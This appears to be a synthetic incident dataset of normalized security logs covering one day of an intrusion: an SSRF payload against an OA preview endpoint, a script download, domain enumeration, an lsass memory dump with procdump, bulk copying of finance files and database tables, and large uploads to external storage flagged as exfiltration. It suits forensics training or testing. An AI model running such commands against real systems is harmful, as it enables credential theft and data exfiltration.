+=== obj-20260706-017768 [jsonl] logs/cloud/object_storage_access_20260706.jsonl
+{"action": "list_bucket", "actor": "role/oss-backup-reader", "event_id": "obj-20260706-017768", "event_type": "object_access", "host": "oss-backup", "raw": "list production backup bucket", "resource": "bucket/prod-backup", "result": "success", "source": "object_storage", "src_ip": "10.20.60.41", "timestamp": "2026-07-06T10:42:09+08:00"}
+=== obj-20260706-017769 [jsonl] logs/cloud/object_storage_access_20260706.jsonl
+{"action": "get_object", "actor": "role/oss-backup-reader", "bytes": 734003200, "event_id": "obj-20260706-017769", "event_type": "object_access", "host": "oss-backup", "raw": "large backup object read", "resource": "bucket/prod-backup/erp_full_20260705.tar.zst", "result": "success", "source": "object_storage", "src_ip": "10.20.60.41", "timestamp": "2026-07-06T11:15:00+08:00"}
+=== pgsql-20260706-028001 [csv] logs/data/pgsql_bi_audit_20260706.csv
+{"event_id": "pgsql-20260706-028001", "timestamp": "2026-07-06T10:12:00+08:00", "db_host": "pgsql-bi-01", "db_user": "bi_sync", "src_ip": "10.20.30.11", "database": "bi", "query_type": "connect", "object": "session", "rows": "0", "bytes": "0", "result": "success", "raw": "bi_sync login from jump host"}
+=== pgsql-20260706-028002 [csv] logs/data/pgsql_bi_audit_20260706.csv
+{"event_id": "pgsql-20260706-028002", "timestamp": "2026-07-06T10:18:00+08:00", "db_host": "pgsql-bi-01", "db_user": "bi_sync", "src_ip": "10.20.30.11", "database": "bi", "query_type": "copy", "object": "dw_customer_full", "rows": "215864", "bytes": "55908776", "result": "success", "raw": "COPY dw_customer_full TO STDOUT"}
+=== pgsql-20260706-028003 [csv] logs/data/pgsql_bi_audit_20260706.csv
+{"event_id": "pgsql-20260706-028003", "timestamp": "2026-07-06T10:18:40+08:00", "db_host": "pgsql-bi-01", "db_user": "bi_sync", "src_ip": "10.20.30.11", "database": "bi", "query_type": "copy", "object": "dw_order_detail", "rows": "444092", "bytes": "92815228", "result": "success", "raw": "COPY dw_order_detail TO STDOUT"}
+=== pgsql-20260706-028004 [csv] logs/data/pgsql_bi_audit_20260706.csv
+{"event_id": "pgsql-20260706-028004", "timestamp": "2026-07-06T10:19:20+08:00", "db_host": "pgsql-bi-01", "db_user": "bi_sync", "src_ip": "10.20.30.11", "database": "bi", "query_type": "copy", "object": "dw_invoice_2026", "rows": "369447", "bytes": "82017234", "result": "success", "raw": "COPY dw_invoice_2026 TO STDOUT"}
+=== proxy-20260706-112001 [csv] logs/network/proxy_20260706.csv
+{"event_id": "proxy-20260706-112001", "timestamp": "2026-07-06T09:16:14+08:00", "proxy": "proxy-01", "user": "www-data", "src_ip": "10.20.10.21", "method": "GET", "url": "https://203.0.113.60/a.sh", "domain": "203.0.113.60", "status": "200", "bytes_out": "412", "bytes_in": "38291", "category": "uncategorized", "raw": "script download from unusual domain"}
+=== proxy-20260706-112002 [csv] logs/network/proxy_20260706.csv
+{"event_id": "proxy-20260706-112002", "timestamp": "2026-07-06T11:08:00+08:00", "proxy": "proxy-01", "user": "deploy", "src_ip": "10.20.30.11", "method": "POST", "url": "https://archive-sync-bkt.storage.example/upload/bi_part01.zst", "domain": "archive-sync-bkt.storage.example", "status": "200", "bytes_out": "268435456", "bytes_in": "1024", "category": "cloud-storage", "raw": "large upload to external object storage"}
+=== proxy-20260706-112003 [csv] logs/network/proxy_20260706.csv
+{"event_id": "proxy-20260706-112003", "timestamp": "2026-07-06T11:15:30+08:00", "proxy": "proxy-01", "user": "gitlab-runner", "src_ip": "10.20.60.41", "method": "PUT", "url": "https://archive-sync-bkt.storage.example/upload/erp_full_20260705.tar.zst", "domain": "archive-sync-bkt.storage.example", "status": "200", "bytes_out": "734003200", "bytes_in": "2048", "category": "cloud-storage", "raw": "large backup upload by ci runner"}
+=== proxy-20260706-112004 [csv] logs/network/proxy_20260706.csv
+{"event_id": "proxy-20260706-112004", "timestamp": "2026-07-06T11:50:12+08:00", "proxy": "proxy-01", "user": "deploy", "src_ip": "10.20.30.11", "method": "POST", "url": "https://cdn-sync.example/sync/full.tar", "domain": "cdn-sync.example", "status": "200", "bytes_out": "1073741824", "bytes_in": "1100", "category": "unknown", "raw": "final large exfiltration upload"}
+=== sysmon-ad-20260706-000001 [jsonl] logs/windows/ad-dc-01_sysmon.jsonl
+{"command_line": "net group 'Domain Admins' /domain", "dst_ip": "10.20.40.10", "event_code": 1, "event_id": "sysmon-ad-20260706-000001", "event_type": "sysmon", "host": "ad-dc-01", "image": "C:\\Windows\\System32\\cmd.exe", "raw": "domain enumeration command", "source": "sysmon", "src_ip": "10.20.30.11", "timestamp": "2026-07-06T10:13:00+08:00", "user": "CORP\\svc_backup"}
+=== sysmon-ad-20260706-000002 [jsonl] logs/windows/ad-dc-01_sysmon.jsonl
+{"command_line": "nltest /dclist:corp.local", "dst_ip": "10.20.40.10", "event_code": 1, "event_id": "sysmon-ad-20260706-000002", "event_type": "sysmon", "host": "ad-dc-01", "image": "C:\\Windows\\System32\\cmd.exe", "raw": "domain enumeration command", "source": "sysmon", "src_ip": "10.20.30.11", "timestamp": "2026-07-06T10:13:20+08:00", "user": "CORP\\svc_backup"}
+=== sysmon-ad-20260706-000003 [jsonl] logs/windows/ad-dc-01_sysmon.jsonl
+{"command_line": "net view /domain", "dst_ip": "10.20.40.10", "event_code": 1, "event_id": "sysmon-ad-20260706-000003", "event_type": "sysmon", "host": "ad-dc-01", "image": "C:\\Windows\\System32\\cmd.exe", "raw": "domain enumeration command", "source": "sysmon", "src_ip": "10.20.30.11", "timestamp": "2026-07-06T10:13:40+08:00", "user": "CORP\\svc_backup"}
+=== sysmon-fil-20260706-024801 [jsonl] logs/windows/file-srv-01_sysmon.jsonl
+{"command_line": "robocopy \\\\file-srv-01\\finance C:\\Temp\\f /E", "dst_ip": "10.20.30.41", "event_code": 11, "event_id": "sysmon-fil-20260706-024801", "event_type": "file_create", "host": "file-srv-01", "image": "C:\\Windows\\System32\\robocopy.exe", "raw": "bulk copy finance files", "source": "sysmon", "src_ip": "10.20.20.34", "timestamp": "2026-07-06T10:41:04+08:00", "user": "CORP\\svc_backup"}
+=== sysmon-win-20260706-024801 [jsonl] logs/windows/win-admin-01_sysmon.jsonl
+{"command_line": "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\ls.dmp", "event_code": 10, "event_id": "sysmon-win-20260706-024801", "event_type": "process_access", "host": "win-admin-01", "image": "C:\\Windows\\Temp\\procdump.exe", "raw": "lsass memory access", "source": "sysmon", "src_ip": "10.20.30.11", "target_image": "C:\\Windows\\System32\\lsass.exe", "timestamp": "2026-07-06T10:27:00+08:00", "user": "CORP\\svc_backup"}
+=== sysmon-win-20260706-024802 [jsonl] logs/windows/win-admin-01_sysmon.jsonl
+{"command_line": "7z.exe a C:\\Temp\\finance_q2.7z C:\\Temp\\f", "dst_ip": "10.20.30.11", "event_code": 1, "event_id": "sysmon-win-20260706-024802", "event_type": "sysmon", "host": "win-admin-01", "image": "C:\\Program Files\\7-Zip\\7z.exe", "raw": "archive finance files", "source": "sysmon", "src_ip": "10.20.20.34", "timestamp": "2026-07-06T10:49:00+08:00", "user": "CORP\\svc_backup"}
+=== waf-20260706-096141 [jsonl] logs/edge/waf_20260706.jsonl
+{"client_ip": "198.51.100.77", "dst_ip": "10.20.10.21", "event_id": "waf-20260706-096141", "event_type": "http_request", "host": "waf-01", "method": "GET", "path": "/login", "raw": "external probe /login", "risk": "medium", "rule_id": "", "source": "waf", "status": 200, "timestamp": "2026-07-06T09:05:01+08:00", "user_agent": "python-requests/2.31"}
+=== waf-20260706-096142 [jsonl] logs/edge/waf_20260706.jsonl
+{"client_ip": "198.51.100.77", "dst_ip": "10.20.10.21", "event_id": "waf-20260706-096142", "event_type": "http_request", "host": "waf-01", "method": "GET", "path": "/api", "raw": "external probe /api", "risk": "medium", "rule_id": "WAF-PROBE-001", "source": "waf", "status": 404, "timestamp": "2026-07-06T09:05:13+08:00", "user_agent": "python-requests/2.31"}
+=== waf-20260706-096143 [jsonl] logs/edge/waf_20260706.jsonl
+{"client_ip": "198.51.100.77", "dst_ip": "10.20.10.21", "event_id": "waf-20260706-096143", "event_type": "http_request", "host": "waf-01", "method": "GET", "path": "/upload", "raw": "external probe /upload", "risk": "medium", "rule_id": "WAF-PROBE-001", "source": "waf", "status": 404, "timestamp": "2026-07-06T09:05:25+08:00", "user_agent": "python-requests/2.31"}
+=== waf-20260706-096144 [jsonl] logs/edge/waf_20260706.jsonl
+{"client_ip": "198.51.100.77", "dst_ip": "10.20.10.21", "event_id": "waf-20260706-096144", "event_type": "http_request", "host": "waf-01", "method": "GET", "path": "/oa/preview", "raw": "external probe /oa/preview", "risk": "medium", "rule_id": "WAF-PROBE-001", "source": "waf", "status": 404, "timestamp": "2026-07-06T09:05:37+08:00", "user_agent": "python-requests/2.31"}
+=== waf-20260706-096145 [jsonl] logs/edge/waf_20260706.jsonl
+{"client_ip": "198.51.100.77", "dst_ip": "10.20.10.21", "event_id": "waf-20260706-096145", "event_type": "http_request", "host": "waf-01", "method": "GET", "path": "/admin", "raw": "external probe /admin", "risk": "medium", "rule_id": "WAF-PROBE-001", "source": "waf", "status": 404, "timestamp": "2026-07-06T09:05:49+08:00", "user_agent": "python-requests/2.31"}
+=== waf-20260706-096146 [jsonl] logs/edge/waf_20260706.jsonl
+{"client_ip": "198.51.100.77", "dst_ip": "10.20.10.21", "event_id": "waf-20260706-096146", "event_type": "http_attack", "host": "waf-01", "method": "POST", "path": "/oa/preview?url=gopher://127.0.0.1:6379/_eval", "raw": "ssrf-like payload to oa preview", "risk": "high", "rule_id": "WAF-SSRF-8842", "source": "waf", "status": 200, "timestamp": "2026-07-06T09:14:22+08:00", "user_agent": "curl/8.4"}
+=== winsec-ad-20260706-000001 [jsonl] logs/windows/ad-dc-01_security.jsonl
+{"event_code": 4624, "event_id": "winsec-ad-20260706-000001", "event_type": "windows_security", "host": "ad-dc-01", "logon_type": 3, "process": "lsass.exe", "raw": "network logon from unusual source", "source": "windows_security", "src_ip": "10.20.30.11", "status": "success", "timestamp": "2026-07-06T10:08:06+08:00", "user": "CORP\\svc_backup"}
+=== winsec-ad-20260706-000002 [jsonl] logs/windows/ad-dc-01_security.jsonl
+{"event_code": 4769, "event_id": "winsec-ad-20260706-000002", "event_type": "kerberos_service_ticket", "host": "ad-dc-01", "raw": "kerberos service ticket requested from jump", "service": "ldap/ad-dc-01", "source": "windows_security", "src_ip": "10.20.30.11", "status": "success", "timestamp": "2026-07-06T10:08:11+08:00", "user": "CORP\\svc_backup"}
+=== winsec-fil-20260706-024848 [jsonl] logs/windows/file-srv-01_security.jsonl
+{"access": "read", "event_code": 5145, "event_id": "winsec-fil-20260706-024848", "event_type": "windows_file_share", "host": "file-srv-01", "object": "Finance2025/Q2/contracts", "raw": "sensitive finance share read", "share": "\\\\file-srv-01\\finance", "source": "windows_security", "src_ip": "10.20.20.34", "status": "success", "timestamp": "2026-07-06T10:41:00+08:00", "user": "CORP\\svc_backup"}
+=== winsec-win-20260706-024842 [jsonl] logs/windows/win-admin-01_security.jsonl
+{"event_code": 4624, "event_id": "winsec-win-20260706-024842", "event_type": "windows_security", "host": "win-admin-01", "logon_type": 10, "process": "winlogon.exe", "raw": "remote interactive logon by service account; source omitted in normalized feed", "source": "windows_security", "src_ip": "", "status": "success", "timestamp": "2026-07-06T10:22:00+08:00", "user": "CORP\\svc_backup"}
+=== winsec-win-20260706-024843 [jsonl] logs/windows/win-admin-01_security.jsonl
+{"event_code": 4672, "event_id": "winsec-win-20260706-024843", "event_type": "special_privileges", "host": "win-admin-01", "privileges": "SeDebugPrivilege,SeBackupPrivilege", "raw": "special privileges assigned", "source": "windows_security", "src_ip": "", "status": "success", "timestamp": "2026-07-06T10:22:03+08:00", "user": "CORP\\svc_backup"}
+
+Missing: []
